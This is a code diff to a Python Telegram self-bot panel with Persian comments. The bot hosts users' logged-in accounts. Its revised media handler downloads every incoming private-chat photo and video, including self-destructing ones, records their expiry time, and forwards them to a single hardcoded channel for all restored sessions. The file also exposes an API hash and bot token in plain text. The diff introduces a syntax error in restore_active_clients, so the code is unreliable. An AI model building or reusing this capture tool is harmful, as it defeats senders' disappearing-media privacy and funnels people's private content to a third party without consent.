@@ -12,7 +12,6 @@ API_ID = 26123074
 API_HASH = 'e54093aa586de25491a6d9394fd55534'
 BOT_TOKEN = '8940705403:AAHW9N_6lEDbL6LXy79KX_SEt-XphYDtp_Y'
 
-# آیدی کانال شما برای ذخیره رسانه‌ها
 TARGET_CHANNEL = -1004418089041
 
 bot = TelegramClient('star_bot_panel', API_ID, API_HASH)
@@ -164,35 +163,18 @@ async def handle_text(event):
     elif text == "📜 قوانین «":
         await event.respond("قوانین استفاده از سیستم سلف‌بات استار...", buttons=main_menu())
 
-# تابع دقیق شکار رسانه‌ها و استخراج کامل ثانیه‌های تایم‌دار و ویدیو
+# تابع جدید و کاملاً ساده‌شده برای تضمین گرفتن هر رسانه‌ای در پی‌وی
 async def catch_media_handler(event):
-    if not event.is_private:
-        return
+    try:
+        # بررسی اینکه حتما در چت خصوصی باشد و پیام ارسالی خودمان نباشد
+        if not event.is_private or event.out:
+            return
 
-    if event.media:
-        try:
-            if event.out:
-                return
-
-            if event.is_reply and event.raw_text and "شکار" in event.raw_text:
-                return
-
-            # فیلتر کردن استیکرها و گیف‌های معمولی
-            if hasattr(event.media, 'document') and event.media.document:
-                for attr in event.media.document.attributes:
-                    if type(attr).__name__ == 'DocumentAttributeSticker':
-                        return
-                if getattr(event.media.document, 'mime_type', '') == 'image/gif':
-                    return
-
-            # استخراج دقیق تایم انقضای عکس یا ویدیو (Self-destruct TTL)
-            ttl_seconds = None
-            if hasattr(event.message, 'ttl_period') and event.message.ttl_period:
-                ttl_seconds = event.message.ttl_period
-            elif hasattr(event.media, 'ttl_seconds') and event.media.ttl_seconds:
-                ttl_seconds = event.media.ttl_seconds
-
-            # استخراج دقیق مدت زمان ویدیو (Duration)
+        if event.media:
+            # استخراج تایم انقضا
+            ttl_seconds = getattr(event.message, 'ttl_period', None) or getattr(event.media, 'ttl_seconds', None)
+            
+            # استخراج زمان ویدیو
             video_duration = None
             if hasattr(event.media, 'document') and event.media.document:
                 for attr in event.media.document.attributes:
@@ -201,37 +183,22 @@ async def catch_media_handler(event):
 
             file_path = await event.download_media()
             if file_path:
-                is_video_note = False
-                if hasattr(event.media, 'document') and event.media.document:
-                    for attr in event.media.document.attributes:
-                        if type(attr).__name__ == 'DocumentAttributeVideo' and getattr(attr, 'round_message', False):
-                            is_video_note = True
-                            break
-
-                # ساخت کپشن جامع شامل تمام اطلاعات ثانیه‌ای
-                caption_parts = ["📥 شکار رسانه توسط سلف‌بات!"]
-                
+                caption_text = "📥 شکار رسانه تایم‌دار / معمولی!"
                 if ttl_seconds:
-                    caption_parts.append(f"⏱ تایم مخفی بودن (انقضا): {ttl_seconds} ثانیه")
-                
+                    caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
                 if video_duration:
-                    caption_parts.append(f"⏳ مدت زمان ویدیو: {video_duration} ثانیه")
-
-                caption_text = "\n".join(caption_parts)
+                    caption_text += f"\n⏳ مدت زمان ویدیو: {video_duration} ثانیه"
 
                 client = event.client
-                if is_video_note:
-                    await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=f"📥 شکار ویدیو مسج!\n⏳ مدت زمان: {video_duration or 'نامشخص'} ثانیه")
-                else:
-                    await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
+                await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
 
                 if os.path.exists(file_path):
                     os.remove(file_path)
-        except Exception as err:
-            print(f"خطا در دانلود یا ارسال رسانه به کانال: {err}")
+    except Exception as err:
+        print(f"خطا در شکار رسانه: {err}")
 
 async def finish_login(event, chat_id, client, phone):
-    client.remove_event_handler(catch_media_handler, events.NewMessage)
+    client.remove_event_handler(catch_media_handler)
     client.add_event_handler(catch_media_handler, events.NewMessage)
                 
     user_clients[phone] = client
@@ -288,7 +255,7 @@ async def callback(event):
 
 async def restore_active_clients():
     for chat_id, data in database.items():
-        if data.get("status") == "active" and "phone" in data:
+        if data.get("status"] == "active" and "phone" in data:
             phone = data["phone"]
             try:
                 client = TelegramClient(f"session_{phone.replace('+', '')}", API_ID, API_HASH)
@@ -296,7 +263,7 @@ async def restore_active_clients():
                 if await client.is_user_authorized():
                     user_clients[phone] = client
                     
-                    client.remove_event_handler(catch_media_handler, events.NewMessage)
+                    client.remove_event_handler(catch_media_handler)
                     client.add_event_handler(catch_media_handler, events.NewMessage)
                                 
                     print(f"سلف ربات {phone} با موفقیت بازیابی شد.")
